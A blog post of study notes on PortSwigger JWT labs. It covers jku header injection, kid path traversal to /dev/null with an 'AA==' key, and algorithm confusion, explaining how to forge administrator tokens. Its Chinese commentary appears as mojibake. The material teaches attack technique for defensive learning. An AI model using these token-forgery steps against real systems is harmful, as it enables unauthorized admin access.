<p>A JWK Set is a JSON object containing an array of JWKs representing different keys. You can see an example of this below.</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;75d0ef47-af89-47a9-9061-7c02a610d5ab&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as <code>/.well-known/jwks.json</code>.</p>
<p>More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering. </p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection"><strong>Lab5: JWT authentication bypass via jku header injection</strong></a></p>
<p>æ„æ€æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨headerä¸­æ’å…¥<code>jku</code>ï¼Œjkuæ˜¯ä¸€ä¸ªURLï¼Œå®šä½ä¸€ä¸ªJWK Setï¼Œè¯¥Setä¸­å­˜æœ‰å¯†é’¥ï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ®æ­¤URLè®¿é—®Setï¼Œå¹¶ä»Setä¸­é€‰å–å¯†é’¥è¿›è¡ŒéªŒè¯ï¼ˆåº”è¯¥æ˜¯æ ¹æ®<code>kid</code>é€‰å–ï¼‰ã€‚</p>
<p>æ³¨ï¼šJWKæŒ‡çš„æ˜¯å…¬é’¥ï¼Œæ‰€ä»¥å¯ä»¥è¢«å…¬å¼€ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥è·å–ï¼Œå¯ä»¥åœ¨ç½‘ç«™çš„å¦‚ä¸‹è·¯åŠ²è·å–åˆ°ï¼š&#x2F;.well-known&#x2F;jwks.jsonã€‚æœåŠ¡å™¨å…ˆç”¨ç§é’¥å¯¹header+payloadç­¾åï¼Œç„¶åç­¾å‘ç»™ç”¨æˆ·ï¼Œå½“ç”¨æˆ·å°†JWTå‘é€è‡³æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ç”¨å…¬é’¥è¿›è¡ŒéªŒè¯ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ’å…¥<code>jku</code>æ¥è¾¾åˆ°Lab 4ä¸­æ’å…¥JWTçš„æ•ˆæœã€‚</p>
<p>å…·ä½“æ­¥éª¤ä¸Lab 4å·®ä¸å¤šï¼Œå…ˆå°†è‡ªå·±ç”Ÿæˆçš„å…¬é’¥ä»¥JWTçš„å½¢å¼å¤åˆ¶ä¸‹æ¥ï¼Œå¹¶ä¿å­˜è‡³jsonæ–‡ä»¶ï¼Œå†ä½¿ç”¨æŸä¸ªurlå®šä½æ­¤jsonæ–‡ä»¶ï¼Œç„¶åå°†urlæ’å…¥headerä¸­çš„<code>jku</code>ï¼Œä¿®æ”¹<code>sub</code>ä¸ºadministratorï¼Œæœ€åå†ä½¿ç”¨è‡ªå·±çš„ç§é’¥å¯¹headerå’Œpayloadç­¾åå³å¯ã€‚</p>
<p>å…³é”®æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<p>å°†å…¬é’¥ä»¥JWKçš„å½¢å¼ä¸Šä¼ è‡³æœåŠ¡å™¨ã€‚</p>
<p><a href="/../img/JWT-attacks/5-1.png" title="5-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/5-1.png" alt="5-1"></a></p>
<p>ä¿®æ”¹header(åŠ ä¸Š<code>jku</code>)ã€payload(ä¿®æ”¹<code>sub</code>)ï¼Œæœ€åç”¨å¯¹åº”çš„ç§é’¥ç­¾åå³å¯å®ŒæˆJWTçš„ä¼ªé€ ã€‚æœ€åå‘é€æ•°æ®åŒ…è®¿é—®&#x2F;adminå³å¯ã€‚</p>
<p><a href="/../img/JWT-attacks/5-2.png" title="5-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/5-2.png" alt="5-2"></a></p>
<p>æˆåŠŸè®¿é—®åˆ°&#x2F;adminé¡µé¢ï¼Œå°†carlosåˆ é™¤å³å¯å®Œæˆå®éªŒã€‚</p>
<p>é™„ï¼šä½†æ˜¯åœ¨åšçš„æ—¶å€™å‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œåˆšå¼€å§‹æˆ‘æŠŠJWKéƒ¨ç½²åœ¨Githubçš„é™æ€ä¸ªäººåšå®¢ä¸Šï¼Œä½†æ˜¯è¿™æ ·ä¸€ç›´æ²¡æœ‰æˆåŠŸï¼Œè¿”å›çš„æ•°æ®éƒ½æ˜¯401 Unauthorizedã€‚</p>
<p>ä½†æ˜¯ä½¿ç”¨Port Swiggerè‡ªå¸¦çš„æœåŠ¡å™¨å°±å¯ä»¥â€¦.</p>
<p>Githubè¿”å›çš„è¿”å›å†…å®¹ï¼š</p>
<p><a href="/../img/JWT-attacks/5-3.png" title="5-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/5-3.png" alt="5-3"></a></p>
<p>Port Swiggerè‡ªå¸¦æœåŠ¡å™¨è¿”å›çš„å†…å®¹ï¼š</p>
<p><a href="/../img/JWT-attacks/5-4.png" title="5-4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/5-4.png" alt="5-4"></a></p>
<p>ä»–ä»¬çš„Responseå†…å®¹éƒ½ä¸€æ ·â€¦..ä½†æ˜¯ç”¨Githubçš„urlå°±ä¼šå¤±è´¥ï¼Œå¯èƒ½æ˜¯å› ä¸ºPort Swiggerä¸‹è½½ä¸‹æ¥çš„æ˜¯htmlæ–‡ä»¶ï¼Œè€Œä¸”å†…å®¹ä¸ºï¼š</p>
<p><a href="/../img/JWT-attacks/5-5.png" title="5-5" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/5-5.png" alt="5-5"></a></p>
<p>è€Œæˆ‘çš„githubéƒ¨ç½²çš„æ˜¯jsonæ–‡ä»¶ã€‚</p>
<h4 id="Injecting-self-signed-JWTs-via-the-kid-parameter"><a href="#Injecting-self-signed-JWTs-via-the-kid-parameter" class="headerlink" title="Injecting self-signed JWTs via the kid parameter"></a>Injecting self-signed JWTs via the kid parameter</h4><p>Servers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a <code>kid</code> (Key ID) parameter, which helps the server identify which key to use when verifying the signature.</p>
<p>Verification keys are often stored as a JWK Set. In this case, the server may simply look for the JWK with the same <code>kid</code> as the token. However, the JWS specification doesnâ€™t define a concrete structure for this ID - itâ€™s just an arbitrary string of the developerâ€™s choosing. For example, they might use the <code>kid</code> parameter to point to a particular entry in a database, or even the name of a file.</p>
<p>If this parameter is also vulnerable to <strong>directory traversal</strong>, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../path/to/file&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;k&quot;</span><span class="punctuation">:</span> <span class="string">&quot;asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>This is especially dangerous if the server also supports JWTs signed using a symmetric algorithm. In this case, an attacker could potentially point the <code>kid</code> parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.</p>
<p>You could theoretically do this with any file, but one of the simplest methods is to use <code>/dev/null</code>, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature.</p>
<hr>
<p>è¿™æ®µæ–‡å­—çš„å¤§è‡´çš„æ„æ€æ˜¯ï¼š</p>
<p>æœåŠ¡å™¨ä¸Šå¯èƒ½æœ‰å¾ˆå¤šçš„keyç”¨äºåŠ å¯†ã€è§£å¯†æˆ–è€…éªŒè¯ã€‚å½“æœåŠ¡å™¨æ”¶åˆ°ä¸€ä¸ªJWTæ—¶ï¼Œå®ƒä¼šæ ¹æ®<code>kid</code>çš„å€¼å»æ‰¾keyã€‚</p>
<p>åœ¨JWTçš„å‘½åè§„èŒƒä¸­ï¼Œå¹¶æ²¡æœ‰å¯¹<code>kid</code>çš„ç‰¹æ®Šè§„å®šï¼Œå®ƒä»…ä»…åªæ˜¯å­—ç¬¦ä¸²stringã€‚ç¨‹åºå‘˜å¯ä»¥éšæ„è®¾å®š<code>kid</code>ï¼Œæœ‰æ—¶ä»–ä»¬å¯ä»¥å°†<code>kid</code>è®¾ä¸ºæ•°æ®åœ¨æ•°æ®åº“ä¸­æˆ–è€…æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä½ç½®ã€‚</p>
<p>å¦‚æœå­˜åœ¨<strong>æ–‡ä»¶éå†æ¼æ´</strong>ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥æŒ‡å®šæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ä½œä¸ºéªŒè¯çš„å¯†é’¥ï¼Œè¿™æ ·å°±å¯æ§åˆ¶æœåŠ¡å™¨ä½¿ç”¨çš„å¯†é’¥äº†ï¼Œè¿›è€Œå¯ä»¥ä¼ªé€ JWTã€‚</p>
<blockquote>
<p>è¿™é‡Œçš„æ–‡ä»¶éå†æ¼æ´ï¼Œåœ¨æˆ‘çš„ç†è§£ä¸‹å°±æ˜¯ï¼šæœåŠ¡å™¨é»˜è®¤kidæ˜¯å­˜çš„æ•°æ®ï¼ˆkeyï¼‰çš„è·¯å¾„ï¼Œå°†kidä½œä¸ºè·¯å¾„å»å¯»æ‰¾å¯†é’¥ï¼Œè€Œä¸æ˜¯åœ¨JWT  Setä¸­æ¯”å¯¹ã€‚</p>
</blockquote>
<p>è‹¥å­˜åœ¨æ–‡ä»¶éå†æ¼æ´ï¼ŒåŒæ—¶è¯¥æœåŠ¡å™¨ä½¿ç”¨çš„éªŒè¯ç®—æ³•ä¸ºå¯¹ç§°åŠ å¯†ï¼Œé‚£ä¹ˆå°±éå¸¸å±é™©ï¼Œç†è®ºä¸Šæ¥è¯´ï¼Œå¯ä»¥ä½¿æœåŠ¡å™¨ä¸Šå°†ä»»ä½•ä¸€ä¸ªæ–‡ä»¶ï¼ˆå‰ææ˜¯çŸ¥é“å®ƒçš„è·¯å¾„ï¼‰çš„å†…å®¹ä½œä¸ºéªŒè¯çš„å¯†é’¥ã€‚ä½†æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨<code>dev/null</code>ï¼Œå®ƒå­˜åœ¨äºå¤§å¤šæ•° Linux ç³»ç»Ÿä¸Šã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œè¯»å–å®ƒä¼šè¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚å› æ­¤ï¼Œä½¿ç”¨ç©ºå­—ç¬¦ä¸²å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åå°†å¾—åˆ°æœ‰æ•ˆçš„ç­¾åã€‚</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal"><strong>Lab6: JWT authentication bypass via kid header path traversal</strong></a></p>
<p>é€šè¿‡æŠ“åŒ…å‘ç°æœåŠ¡å™¨çš„éªŒè¯ç¨‹åºä½¿ç”¨çš„æ˜¯å¯¹ç§°å¯†ç ç®—æ³•HS256ã€‚äºæ˜¯æˆ‘ä»¬å°è¯•å¯¹<code>kid</code>è¿›è¡Œä¿®æ”¹ï¼Œè®©æœåŠ¡å™¨ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡ŒéªŒè¯ï¼Œç„¶åæˆ‘ä»¬ä¹Ÿç”¨ç©ºå­—ç¬¦ä¸²ç­¾åï¼Œè¿™æ ·å°±å¯ä»¥è¾¾åˆ°ä¼ªé€ JWTçš„æ•ˆæœäº†ã€‚</p>
<p>åœ¨linuxç³»ç»Ÿä¸­ï¼Œ<code>/</code> (æ ¹ç›®å½•)ï¼šæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„èµ·å§‹ç‚¹ï¼Œæ‰€æœ‰å…¶ä»–ç›®å½•éƒ½æ˜¯åœ¨æ ¹ç›®å½•ä¸‹çš„å­ç›®å½•ï¼Œdevæ–‡ä»¶å¤¹å°±åœ¨æ ¹ç›®å½•ä¸‹ã€‚</p>
<p>æ˜¾ç„¶ï¼Œkidæ˜¯ç›¸å¯¹è·¯å¾„ï¼Œå¦‚æœç›´æ¥å°†<code>kid</code>è®¾ä¸º<code>/dev/null</code>ï¼ŒæœåŠ¡å™¨ä¼šä»å½“å‰ç›®å½•ä¸‹å¯»æ‰¾ï¼Œå½“ç„¶ä¼šå¤±è´¥ã€‚è¿™æ—¶å°±å¿…é¡»å…ˆä¸€æ­¥ä¸€æ­¥å›é€€ä¸Šä¸€çº§ç›®å½•ï¼Œä½¿ç”¨<code>../</code>ï¼Œå›é€€åˆ°æ ¹ç›®å½•ï¼ˆå³ä½¿å›é€€åˆ°äº†æ ¹ç›®å½•ï¼Œå†é€€ä¹Ÿè¿˜æ˜¯æ ¹ç›®å½•ï¼‰ï¼Œä»æ‰èƒ½æ­£ç¡®è¿›å…¥devæ–‡ä»¶å¤¹è¯»å–nullã€‚ç»è¿‡æˆ‘çš„æµ‹è¯•ï¼Œå›é€€ä¸‰æ¬¡å³å¯æˆåŠŸè¯»å–åˆ°nullã€‚</p>
<p><a href="/../img/JWT-attacks/6-1.png" title="6-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/6-1.png" alt="6-1"></a></p>
<p>æœåŠ¡å™¨å®é™…ä¸Šä» <code>/dev/null</code> è¯»å–çš„å­—ç¬¦ä¸²å°±æ˜¯ <code>00</code> çš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚è¿™æ˜¯å› ä¸º <code>/dev/null</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡ï¼Œè¯»å–æ—¶è¿”å›çš„æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ï¼Œå…¶ ASCII ç å€¼ä¸º 0ï¼ˆä¸€ä¸ªASCIIç å­—ç¬¦å¯¹åº”ä¸€ä¸ªå­—èŠ‚ï¼‰ï¼Œå¯¹åº”çš„åå…­è¿›åˆ¶è¡¨ç¤ºå°±æ˜¯ <code>00</code>ã€‚é‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šå°†åå…­è¿›åˆ¶çš„<code>00</code>ä½œä¸ºå¯¹ç§°å¯†é’¥å¯¹ç­¾åè¿›è¡ŒéªŒè¯ã€‚</p>
<p>ç„¶ååœ¨Burp Suiteä¸­æ–°ç”Ÿæˆä¸€ä¸ªå¯¹ç§°å¯†é’¥ï¼Œç”Ÿæˆåå°†â€kâ€æ”¹ä¸ºâ€AA&#x3D;&#x3D;â€ï¼š</p>
<p><a href="/../img/JWT-attacks/6-2.png" title="6-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/6-2.png" alt="6-2"></a></p>
<p>ä¸ºä»€ä¹ˆKè¦æ”¹ä¸º<code>AA==</code>ï¼Ÿ</p>
<p>å› ä¸ºJWTçš„keyéœ€è¦è¿›è¿‡base64ç¼–ç ï¼Œè€ŒBase64 ç¼–ç æ˜¯å°†äºŒè¿›åˆ¶æ•°æ®æŒ‰ç…§æ¯ 3 ä¸ªå­—èŠ‚ä¸ºä¸€ç»„è¿›è¡Œå¤„ç†ï¼Œå¹¶è½¬æ¢ä¸ºå››ä¸ªå¯æ‰“å°å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ã€‚å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>å°†å¾…ç¼–ç çš„æ•°æ®æŒ‰ç…§æ¯ 3 ä¸ªå­—èŠ‚ï¼ˆ24 ä½ï¼‰ä¸€ç»„è¿›è¡Œåˆ†ç»„ã€‚</li>
<li>å°†æ¯ç»„çš„ 24 ä½æ•°æ®æ‹†åˆ†ä¸ºå››ä¸ª 6 ä½çš„å€¼ï¼ˆ0-63ä¹‹é—´çš„æ•´æ•°ï¼‰ã€‚</li>
<li>å°†è¿™å››ä¸ª 6 ä½çš„å€¼æ˜ å°„åˆ° Base64 å­—ç¬¦è¡¨ä¸­çš„å¯¹åº”å­—ç¬¦ã€‚</li>
</ol>
<p>å¦‚æœæ•°æ®çš„é•¿åº¦ä¸æ˜¯ 3 çš„å€æ•°ï¼Œåˆ™éœ€è¦è¿›è¡Œå¡«å……æ“ä½œã€‚å¡«å……é€šå¸¸ä½¿ç”¨ <code>=</code> å­—ç¬¦ï¼Œå¡«å……çš„è§„åˆ™å¦‚ä¸‹ï¼š</p>
<ul>
<li>å¦‚æœæ•°æ®é•¿åº¦æ˜¯ 1 ä¸ªå­—èŠ‚ï¼Œåˆ™åœ¨æœ«å°¾æ·»åŠ ä¸¤ä¸ª <code>=</code> å­—ç¬¦ï¼Œä»¥å‡‘é½ä¸¤ä¸ª 6 ä½ç»„ã€‚</li>
<li>å¦‚æœæ•°æ®é•¿åº¦æ˜¯ 2 ä¸ªå­—èŠ‚ï¼Œåˆ™åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ª <code>=</code> å­—ç¬¦ï¼Œä»¥å‡‘é½ä¸‰ä¸ª 6 ä½ç»„ã€‚</li>
</ul>
<p>å¯¹äºåå…­è¿›åˆ¶çš„<code>00</code>æ¥è¯´ï¼Œå®ƒè¢«çœ‹ä½œæ˜¯ä¸€ä¸ªå…·æœ‰ 8 ä½çš„äºŒè¿›åˆ¶æ•° <code>00000000</code>ï¼Œå…ˆå°† <code>00000000</code> æ‹†åˆ†ä¸ºä¸¤ä¸ª 6 ä½çš„å€¼ï¼š<code>000000</code> å’Œ <code>00</code>ï¼›ç„¶åå°†è¿™ä¸¤ä¸ª 6 ä½çš„å€¼æ˜ å°„åˆ° Base64 å­—ç¬¦è¡¨ä¸­ï¼š<code>000000</code> å¯¹åº”å­—ç¬¦ <code>A</code>ï¼Œ<code>00</code> å¯¹åº”å­—ç¬¦ <code>A</code>ï¼›æœ€åï¼Œæ·»åŠ  Base64 çš„ padding å­—ç¬¦ <code>=</code>ï¼Œå¾—åˆ°çš„ç¼–ç ç»“æœæ˜¯ï¼š<code>AA==</code>ã€‚</p>
<p>ç„¶åå†ä½¿ç”¨ä¿®æ”¹è¿‡åçš„å¯¹ç§°å¯†é’¥å¯¹ä¼ªé€ çš„headerå’Œpayloadè¿›è¡ŒåŠ å¯†ï¼š</p>
<p><a href="/../img/JWT-attacks/6-3.png" title="6-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/6-3.png" alt="6-3"></a></p>
<p>è‡³æ­¤å°±å®Œæˆäº†JWTçš„ä¼ªé€ ï¼Œç°åœ¨å¯ä»¥æˆåŠŸä»¥administratorçš„èº«ä»½ç™»å½•&#x2F;adminç•Œé¢äº†ã€‚</p>
<p><a href="/../img/JWT-attacks/6-4.png" title="6-4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/6-4.png" alt="6-4"></a></p>
<p>æœ€ååˆ é™¤carlosç”¨æˆ·å®Œæˆå®éªŒã€‚</p>
<h4 id="Other-interesting-JWT-header-parameters"><a href="#Other-interesting-JWT-header-parameters" class="headerlink" title="Other interesting JWT header parameters"></a>Other interesting JWT header parameters</h4><p>The following header parameters may also be interesting for attackers:</p>
<ul>
<li><code>cty</code> (Content Type) - Sometimes used to declare a media type for the content in the JWT payload. This is usually omitted from the header, but the underlying parsing library may support it anyway. If you have found a way to bypass signature verification, you can try injecting a <code>cty</code> header to change the content type to <code>text/xml</code> or <code>application/x-java-serialized-object</code>, which can potentially enable new vectors for <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">XXE</a> and <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/deserialization">deserialization</a> attacks.</li>
<li><code>x5c</code> (X.509 Certificate Chain) - Sometimes used to pass the X.509 public key certificate or certificate chain of the key used to digitally sign the JWT. This header parameter can be used to inject self-signed certificates, similar to the <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter"><code>jwk</code> header injection</a> attacks discussed above. Due to the complexity of the X.509 format and its extensions, parsing these certificates can also introduce vulnerabilities. Details of these attacks are beyond the scope of these materials, but for more details, check out <a target="_blank" rel="noopener" href="https://talosintelligence.com/vulnerability_reports/TALOS-2017-0293">CVE-2017-2800</a> and <a target="_blank" rel="noopener" href="https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633">CVE-2018-2633</a>.</li>
</ul>
<h3 id="JWT-algorithm-confusion"><a href="#JWT-algorithm-confusion" class="headerlink" title="JWT algorithm confusion"></a>JWT algorithm confusion</h3><p>Even if a server uses robust secrets that you are unable to brute-force, you may still be able to forge valid JWTs by signing the token using an algorithm that the developers havenâ€™t anticipated. This is known as an <strong>algorithm confusion attack</strong>.</p>
<p>Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token (<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt">JWT</a>) using a different algorithm than is intended by the websiteâ€™s developers. If this case isnâ€™t handled properly, this may enable attackers to forge valid JWTs containing arbitrary values without needing to know the serverâ€™s secret signing key.</p>
<p><strong>How do algorithm confusion vulnerabilities arise?</strong></p>
<p>Algorithm confusion vulnerabilities typically arise due to flawed implementation of JWT libraries. Although the actual verification process differs depending on the algorithm used, many libraries provide a single, algorithm-agnostic method for verifying signatures. These methods rely on the <code>alg</code> parameter in the tokenâ€™s header to determine the type of verification they should perform.</p>
<p>The following pseudo-code shows a simplified example of what the declaration for this generic <code>verify()</code> method might look like in a JWT library:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function verify(token, secretOrPublicKey)&#123;</span><br><span class="line">    algorithm = token.getAlgHeader();</span><br><span class="line">    if(algorithm == &quot;RS256&quot;)&#123;</span><br><span class="line">        // Use the provided key as an RSA public key</span><br><span class="line">    &#125; else if (algorithm == &quot;HS256&quot;)&#123;</span><br><span class="line">        // Use the provided key as an HMAC secret key</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Problems arise when website developers who subsequently use this method assume that it will exclusively handle JWTs signed using an asymmetric algorithm like RS256. Due to this flawed assumption, they may always pass a fixed public key to the method as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">publicKey = &lt;public-key-of-server&gt;;</span><br><span class="line">token = request.getCookie(&quot;session&quot;);</span><br><span class="line">verify(token, publicKey);</span><br></pre></td></tr></table></figure>

<p>In this case, if the server receives a token signed using a symmetric algorithm like HS256, the libraryâ€™s generic <code>verify()</code> method will treat the public key as an HMAC secret. This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature.</p>
<p>ç®€å•åœ°è¯´ï¼Œç®—æ³•æ··æ·†æ”»å‡»çš„å‰ææ˜¯ï¼š</p>
<ol>
<li>æœåŠ¡å™¨æ‰€ä½¿ç”¨çš„JWT libraryä¸­çš„verifyå‡½æ•°æ˜¯é€šç”¨çš„ï¼ˆè§ä¸Šæ–‡çš„verifyå‡½æ•°ä¼ªä»£ç ï¼‰ã€‚</li>
<li>å¹¶ä¸”æœåŠ¡å™¨é€‰æ‹©ç”¨éå¯¹ç§°åŠ å¯†ç®—æ³•æ¥éªŒè¯ç­¾åï¼Œå³ç”¨ç§é’¥ç­¾åï¼Œå…¬é’¥éªŒè¯ï¼ˆè¿™æ ·ç”¨æˆ·ä¹Ÿå¯ä»¥éªŒè¯è‡ªå·±çš„ç­¾åæ˜¯å¦æœ‰æ•ˆï¼Œè€Œå¯¹ç§°åŠ å¯†ç®—æ³•åªèƒ½åšåˆ°å•å‘éªŒè¯ï¼‰ã€‚</li>
</ol>
<p>å¦‚æœæ”»å‡»è€…å°†headeréƒ¨åˆ†çš„<code>alg</code>æ”¹ä¸ºå¯¹ç§°åŠ å¯†éªŒè¯ç®—æ³•ï¼Œç„¶åè·å–æœåŠ¡å™¨éªŒè¯ç­¾åçš„å…¬é’¥ï¼Œå°†æ­¤å…¬é’¥ä½œä¸ºå¯¹ç§°åŠ å¯†ç®—æ³•çš„å¯†é’¥å¯¹headerå’Œpayloadç­¾åã€‚</p>
<p>æœåŠ¡å™¨æ”¶åˆ°æ”»å‡»è€…ç¯¡æ”¹åçš„JWTï¼Œè¿›å…¥éªŒè¯å‡½æ•°verifyï¼Œæ ¹æ®<code>alg</code>çš„å€¼é€‰æ‹©éªŒè¯ç®—æ³•ã€‚å› ä¸º<code>alg</code>çš„å€¼è¢«æ”»å‡»è€…ç¯¡æ”¹ä¸ºå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šä½¿ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•æ¥éªŒè¯ï¼Œä½†æ˜¯ä»ç„¶è¿˜æ˜¯å–è‡ªå·±çš„å…¬é’¥è¿›è¡ŒéªŒè¯ï¼ˆå› ä¸ºæœåŠ¡å™¨çš„å»ºè®¾è€…èµ·åˆç”¨çš„å°±æ˜¯éå¯¹ç§°åŠ å¯†ç®—æ³•è¿›è¡ŒéªŒè¯ï¼Œä½¿ç”¨å›ºå®šçš„å…¬é’¥éªŒè¯ç­¾åï¼Œé€»è¾‘å¦‚ä¸Šæ–‡çš„ä¼ªä»£ç ï¼šå…ˆå–è‡ªå·±çš„å…¬é’¥ï¼Œç„¶åå†å–å¾—tokenï¼Œæœ€åå°†è¿™ä¸¤ä¸ªå€¼ä¼ å…¥verifyå‡½æ•°è¿›è¡ŒéªŒè¯ï¼‰ã€‚</p>
<p>è¿™æ—¶ï¼Œæ”»å‡»è€…æ˜¯ä½¿ç”¨æœåŠ¡å™¨çš„å…¬é’¥è¿›è¡Œç­¾åçš„ï¼ŒæœåŠ¡å™¨è¿˜æ˜¯ä½¿ç”¨å…¬é’¥æ¥éªŒè¯ï¼Œé‚£ä¹ˆè¢«ç¯¡æ”¹çš„JWTå°±ä¼šé€šè¿‡æ£€æµ‹ã€‚</p>
